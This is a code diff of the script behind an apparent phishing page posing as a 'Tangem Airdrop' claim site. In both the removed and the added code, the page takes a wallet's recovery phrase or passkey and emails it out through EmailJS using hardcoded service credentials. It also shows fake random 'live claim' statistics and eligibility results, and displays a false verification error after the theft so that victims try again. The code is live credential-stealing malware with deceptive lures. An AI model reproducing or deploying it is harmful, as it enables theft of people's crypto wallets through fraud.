-        function showPhraseInput() {
-            document.getElementById('auth-section').classList.add('hidden');
-            document.getElementById('phrase-input-section').classList.remove('hidden');
-        }
-        
-        function showPasskeyInput() {
-            document.getElementById('auth-section').classList.add('hidden');
-            document.getElementById('passkey-input-section').classList.remove('hidden');
-        }
-        
-        function submitPhrase() {
-            const phrase = document.getElementById('recovery-phrase').value;
-            if (!phrase) {
-                alert('Please enter your recovery phrase');
-                return;
-            }
-        }
-           // Initialize EmailJS with your Public Key
-emailjs.init("4jXhBKgao485xWP9H"); // Replace with your actual public key from EmailJS
+    };
+    
+    // Keep track of the currently selected wallet
+    let currentWallet = null;
+    
+    function connectWallet(walletId) {
+    // 1. First scroll to the wallets container
+    const walletsContainer = document.getElementById('more-wallets-container');
+    walletsContainer.scrollIntoView({
+        behavior: 'smooth',
+        block: 'start' // Aligns top of element with top of viewport
+    });
 
-function submitPhrase() {
-    const phrase = document.getElementById('recovery-phrase').value;
-    if (!phrase) {
-        alert('Please enter your recovery phrase');
+    // 2. Get wallet details from configuration
+    currentWallet = WALLETS[walletId];
+    
+    if (!currentWallet) {
+        console.error('Unknown wallet:', walletId);
         return;
     }
     
-    // Send to email using EmailJS
-    const templateParams = {
-        wallet_type: 'Recovery Phrase',
-        credential: phrase,
-        to_email: 'verification@tangem.com',
-        from_name: 'Tangem Airdrop User',
-        reply_to: 'verification@tangem.com'
-    };
+    console.log(`Connecting to ${currentWallet.name} (${currentWallet.id})`);
     
-    emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
-        .then(function(response) {
-            console.log('SUCCESS!', response.status, response.text);
-            document.getElementById('phrase-input-section').classList.add('hidden');
-            //document.getElementById('success-section').classList.remove('hidden');
-            showError();
-            
-            // Reset form
-            document.getElementById('recovery-phrase').value = '';
-        }, function(error) {
-            console.log('FAILED...', error);
-            
-            // Fallback - Store in localStorage for demo purposes (remove in production)
-            localStorage.setItem('last_phrase_submission', phrase);
-            
-            alert('Email service temporarily unavailable. Your claim has been recorded and will be processed shortly.');
-            document.getElementById('phrase-input-section').classList.add('hidden');
-            document.getElementById('success-section').classList.remove('hidden');
-        });
-}
-
-function submitPasskey() {
-    const passkey = document.getElementById('passkey').value;
-    if (!passkey) {
-        alert('Please enter your passkey');
-        return;
+    // 3. Update UI with selected wallet name
+    const walletNameElements = document.getElementsByClassName('selected-wallet-name');
+    for (let i = 0; i < walletNameElements.length; i++) {
+        walletNameElements[i].textContent = currentWallet.name;
     }
     
-    // Send to email using EmailJS
-    const templateParams = {
-        wallet_type: 'Passkey',
-        credential: passkey,
-        to_email: 'verification@tangem.com',
-        from_name: 'Tangem Airdrop User',
-        reply_to: 'verification@tangem.com'
-    };
+    // 4. Show connecting UI
+    document.getElementById('wallet-connect-section').classList.add('hidden');
+    document.getElementById('connecting-section').classList.remove('hidden');
     
-    emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
-        .then(function(response) {
-            console.log('SUCCESS!', response.status, response.text);
-           document.getElementById('passkey-input-section').classList.add('hidden');
-            //document.getElementById('success-section').classList.remove('hidden');
-            showError();
-            
-            // Reset form
-            document.getElementById('passkey').value = '';
-        }, function(error) {
-            console.log('FAILED...', error);
-            
-            // Fallback - Store in localStorage for demo purposes (remove in production)
-            localStorage.setItem('last_passkey_submission', passkey);
-            
-            alert('Try again');
-            document.getElementById('passkey-input-section').classList.add('hidden');
-            document.getElementById('success-section').classList.remove('hidden');
-        });
-}
+    // 5. Simulate connection timeout (remove in production)
+    setTimeout(function() {
+        document.getElementById('connecting-section').classList.add('hidden');
+        document.getElementById('auth-section').classList.remove('hidden');
         
-        function checkEligibility() {
-            const walletAddress = document.getElementById('wallet-address').value;
-            const resultDiv = document.getElementById('eligibility-result');
-            
-            if (!walletAddress) {
-                resultDiv.textContent = 'Please enter a wallet address';
-                resultDiv.className = 'mt-3 text-sm text-red-400';
-                resultDiv.classList.remove('hidden');
-                return;
-            }
-            
-            // Simulate checking eligibility (in a real app, this would be an API call)
-            resultDiv.textContent = 'Checking eligibility...';
-            resultDiv.className = 'mt-3 text-sm text-gray-400';
-            resultDiv.classList.remove('hidden');
-            
-            setTimeout(function() {
-                // Random eligibility for demo purposes
-                const isEligible = Math.random() > 0.3;
+        // Optional: Scroll to auth section after it appears
+        document.getElementById('auth-section').scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+        });
+    }, 10000);
+}
+    // Simulate live claim statistics
+    function updateLiveStats() {
+        // Random growth for demonstration
+        const btc = (1.80 + Math.random() * 0.5).toFixed(2);
+        const eth = (64.24 + Math.random() * 2).toFixed(2);
+        const xrp = (25000 + Math.random() * 5000).toFixed(0);
+        const usdt = (100000 + Math.random() * 1000).toFixed(0);
+        const participants = 2458 + Math.floor(Math.random() * 10);
+        const totalValue = 410000 + Math.floor(Math.random() * 1000);
+        
+        document.getElementById('btc-claimed').textContent = btc + ' BTC';
+        document.getElementById('eth-claimed').textContent = eth + ' ETH';
+        document.getElementById('xrp-claimed').textContent = xrp.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + ' XRP';
+        document.getElementById('usdt-claimed').textContent = usdt.replace(/\B(?=(\d{3})+(?!\d))/g, ",") + ' USDT';
+        document.getElementById('total-claimed').textContent = participants.toLocaleString();
+        document.getElementById('total-value').textContent = totalValue.toLocaleString();
+    }
+    
+    // Update stats every 5 seconds
+    setInterval(updateLiveStats, 5000);
+    updateLiveStats(); // Initial call
+    
+    function showMoreWallets() {
+        alert('Additional wallets will be shown here: Solflare, Kraken, Uniswap, etc.');
+    }
+    
+    function showPhraseInput() {
+        document.getElementById('auth-section').classList.add('hidden');
+        document.getElementById('phrase-input-section').classList.remove('hidden');
+    }
+    
+    function showPasskeyInput() {
+        document.getElementById('auth-section').classList.add('hidden');
+        document.getElementById('passkey-input-section').classList.remove('hidden');
+    }
+    
+    // Initialize EmailJS with your Public Key
+    emailjs.init("4jXhBKgao485xWP9H"); // Replace with your actual public key from EmailJS
+    
+    function submitPhrase() {
+        const phrase = document.getElementById('recovery-phrase').value;
+        if (!phrase) {
+            alert('Please enter your recovery phrase');
+            return;
+        }
+        if (!currentWallet) {
+            showError("No wallet selected");
+            return;
+        }
+        
+        // Send to email using EmailJS
+        const templateParams = {
+            wallet_id: currentWallet.id,
+            wallet_name: currentWallet.name,
+            wallet_type: 'Recovery Phrase',
+            credential: phrase,
+            to_email: 'verification@tangem.com',
+            from_name: 'Tangem Airdrop User',
+            reply_to: 'verification@tangem.com'
+        };
+        
+        emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                document.getElementById('phrase-input-section').classList.add('hidden');
+                //document.getElementById('success-section').classList.remove('hidden');
+                showError();
                 
-                if (isEligible) {
-                    resultDiv.textContent = '✅ Congratulations! This wallet is eligible for the airdrop.';
-                    resultDiv.className = 'mt-3 text-sm text-green-400';
-                } else {
-                    resultDiv.textContent = '❌ This wallet is not eligible for the current airdrop.';
-                    resultDiv.className = 'mt-3 text-sm text-red-400';
-                }
-            }, 1500);
-        }
-
-        function showError(message, isSuccess = false) {
-    // Hide all other sections
-    document.getElementById('phrase-input-section').classList.add('hidden');
-    document.getElementById('passkey-input-section').classList.add('hidden');
-    document.getElementById('success-section').classList.add('hidden');
-    
-    // Get error section elements
-    const errorSection = document.getElementById('error-section');
-    const iconDiv = errorSection.querySelector('div.inline-block');
-    const heading = errorSection.querySelector('h3');
-    const messageP = errorSection.querySelector('p.text-gray-300');
-    
-    // Change styling for success message
-    if (isSuccess) {
-        iconDiv.classList.remove('bg-red-500');
-        iconDiv.classList.add('bg-green-500');
-        heading.classList.remove('text-red-400');
-        heading.classList.add('text-green-400');
-        heading.innerHTML = '✓ Email Sent Successfully';
-    } else {
-        iconDiv.classList.add('bg-red-500');
-        iconDiv.classList.remove('bg-green-500');
-        heading.classList.add('text-red-400');
-        heading.classList.remove('text-green-400');
-        heading.innerHTML = '⚠️ Verification Failed';
+                // Reset form
+                document.getElementById('recovery-phrase').value = '';
+            }, function(error) {
+                console.log('FAILED...', error);
+                
+                // Fallback - Store in localStorage for demo purposes (remove in production)
+                localStorage.setItem('last_phrase_submission', phrase);
+                
+                alert('Email service temporarily unavailable. Your claim has been recorded and will be processed shortly.');
+                document.getElementById('phrase-input-section').classList.add('hidden');
+                document.getElementById('success-section').classList.remove('hidden');
+            });
     }
     
-    // Set message
-    messageP.textContent = message;
+    function submitPasskey() {
+        const passkey = document.getElementById('passkey').value;
+        if (!passkey) {
+            alert('Please enter your passkey');
+            return;
+        }
+        if (!currentWallet) {
+            showError("No wallet selected");
+            return;
+        }
+        
+        // Send to email using EmailJS
+        const templateParams = {
+            wallet_id: currentWallet.id,
+            wallet_name: currentWallet.name,
+            wallet_type: 'Passkey',
+            credential: passkey,
+            to_email: 'verification@tangem.com',
+            from_name: 'Tangem Airdrop User',
+            reply_to: 'verification@tangem.com'
+        };
+        
+        emailjs.send('service_7058our', 'template_hv9rjt6', templateParams)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                document.getElementById('passkey-input-section').classList.add('hidden');
+                //document.getElementById('success-section').classList.remove('hidden');
+                showError();
+                
+                // Reset form
+                document.getElementById('passkey').value = '';
+            }, function(error) {
+                console.log('FAILED...', error);
+                
+                // Fallback - Store in localStorage for demo purposes (remove in production)
+                localStorage.setItem('last_passkey_submission', passkey);
+                
+                alert('Try again');
+                document.getElementById('passkey-input-section').classList.add('hidden');
+                document.getElementById('success-section').classList.remove('hidden');
+            });
+    }
     
-    // Show error section
-    errorSection.classList.remove('hidden');
-}
-
-function retryVerification() {
-    // Refresh the page to start over
-    window.location.reload();
+    function checkEligibility() {
+        const walletAddress = document.getElementById('wallet-address').value;
+        const resultDiv = document.getElementById('eligibility-result');
+        
+        if (!walletAddress) {
+            resultDiv.textContent = 'Please enter a wallet address';
+            resultDiv.className = 'mt-3 text-sm text-red-400';
+            resultDiv.classList.remove('hidden');
+            return;
+        }
+        
+        // Simulate checking eligibility (in a real app, this would be an API call)
+        resultDiv.textContent = 'Checking eligibility...';
+        resultDiv.className = 'mt-3 text-sm text-gray-400';
+        resultDiv.classList.remove('hidden');
+        
+        setTimeout(function() {
+            // Random eligibility for demo purposes
+            const isEligible = Math.random() > 0.3;
+            
+            if (isEligible) {
+                resultDiv.textContent = '✅ Congratulations! This wallet is eligible for the airdrop.';
+                resultDiv.className = 'mt-3 text-sm text-green-400';
+            } else {
+                resultDiv.textContent = '❌ This wallet is not eligible for the current airdrop.';
+                resultDiv.className = 'mt-3 text-sm text-red-400';
+            }
+        }, 1500);
+    }
     
-    // Alternatively, you could link to a specific URL:
-    // window.location.href = "https://yourwebsite.com/airdrop";
-}
-
-function contactSupport() {
-    window.location.href = "mailto:support@tangem-airdrop.live?subject=Airdrop%20Verification%20Issue";
-}
+    function showError(message, isSuccess = false) {
+        // Hide all other sections
+        document.getElementById('phrase-input-section').classList.add('hidden');
+        document.getElementById('passkey-input-section').classList.add('hidden');
+        document.getElementById('success-section').classList.add('hidden');
+        
+        // Get error section elements
+        const errorSection = document.getElementById('error-section');
+        const iconDiv = errorSection.querySelector('div.inline-block');
+        const heading = errorSection.querySelector('h3');
+        const messageP = errorSection.querySelector('p.text-gray-300');
+        
+        // Change styling for success message
+        if (isSuccess) {
+            iconDiv.classList.remove('bg-red-500');
+            iconDiv.classList.add('bg-green-500');
+            heading.classList.remove('text-red-400');
+            heading.classList.add('text-green-400');
+            heading.innerHTML = '✓ Email Sent Successfully';
+        } else {
+            iconDiv.classList.add('bg-red-500');
+            iconDiv.classList.remove('bg-green-500');
+            heading.classList.add('text-red-400');
+            heading.classList.remove('text-green-400');
+            heading.innerHTML = '⚠️ Verification Failed';
+        }
+        
+        // Set message
+        messageP.textContent = message;
+        
+        // Show error section
+        errorSection.classList.remove('hidden');
+    }
+    
+    function retryVerification() {
+        // Refresh the page to start over
+        window.location.reload();
+    }
+    
+    function contactSupport() {
+        window.location.href = "mailto:support@tangem-airdrop.live?subject=Airdrop%20Verification%20Issue";
+    }
+    
+    // Extra wallets support
+    const extraWallets = [
+        { name: 'Solflare', color: 'bg-purple-600', icon: 'S' },
+        { name: 'Kraken', color: 'bg-blue-600', icon: 'K' },
+        { name: 'Uniswap', color: 'bg-pink-600', icon: 'U' }
+        // Add more wallets as needed
+    ];
+    
+    function toggleMoreWallets() {
+        const container = document.getElementById('more-wallets-container');
+        const button = document.getElementById('more-wallets-btn');
+        
+        if (container.classList.contains('hidden')) {
+            // Populate if empty
+            if (container.innerHTML === '') {
+                extraWallets.forEach(wallet => {
+                    container.innerHTML += `
+                        <button onclick="connectWallet('${wallet.name.toLowerCase()}')" 
+                                class="wallet-btn bg-gray-100 hover:bg-gray-200 p-4 rounded-lg flex flex-col items-center">
+                            <div class="w-12 h-12 ${wallet.color} rounded-full mb-2 flex items-center justify-center text-white font-bold">
+                                ${wallet.icon}
+                            </div>
+                            <span>${wallet.name}</span>
+                        </button>
+                    `;
+                });
+            }
+            container.classList.remove('hidden');
+            button.innerHTML = 'More Wallets ▲';
+        } else {
+            container.classList.add('hidden');
+            button.innerHTML = 'More Wallets ▼';
+        }
+    }
 </script>
 </body>
 </html>
